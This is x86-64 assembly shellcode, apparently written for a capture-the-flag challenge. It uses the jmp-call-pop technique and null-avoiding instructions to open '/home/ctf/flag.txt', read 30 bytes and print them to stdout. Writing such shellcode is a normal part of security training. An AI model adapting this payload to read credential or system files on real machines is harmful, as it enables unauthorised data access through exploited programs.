bits 64

;;; OPEN

  ; Syscall 2 = sys_open
  xor rax, rax
  mov al, 2

  ; rdi = filename
  jmp short getfilename_bottom
getfilename_top:
  pop rdi ; Pop the top of the stack (which is the filename) into rdi

  ; rsi = flags
  xor rsi, rsi

  ; rdx = mode
  xor rdx, rdx

  ; Perform sys_open() syscall, the file handle is returned in rax
  syscall

;;; READ

  push rdi ; Temporarly store the filename pointer
  push rax ; Temporarily store the handle

  ; Syscall 0 = sys_read
  xor rax, rax

  ; rdi = file handle
  pop rdi

  ; rsi = buffer (same as filename)
  pop rsi

  ; rdx = count
  xor rdx, rdx
  mov dl, 30

  ; Perform sys_read() syscall, reading from the opened file
  syscall

;;; WRITE

  ; Syscall 1 = sys_write
  xor rax, rax
  inc rax

  ; File handle to write to = stdout = 1
  xor rdi, rdi
  inc rdi

  ; (rsi is already the buffer)

  ; rdx is the count again
  xor rdx, rdx
  mov dl, 30

  ; Perform the sys_write syscall, writing the data to stdout
  syscall

;;; EXIT
  ; Syscall 60 = exit
  xor rax, rax
  mov al, 60

  ; Exit with code 0
  xor rdi, rdi

  ; Perform an exit
  syscall

getfilename_bottom:
  call getfilename_top

  db "/home/ctf/flag.txt" ; The literal flag, fortunately the buffer itself is null-filled so we don't need to null terminate
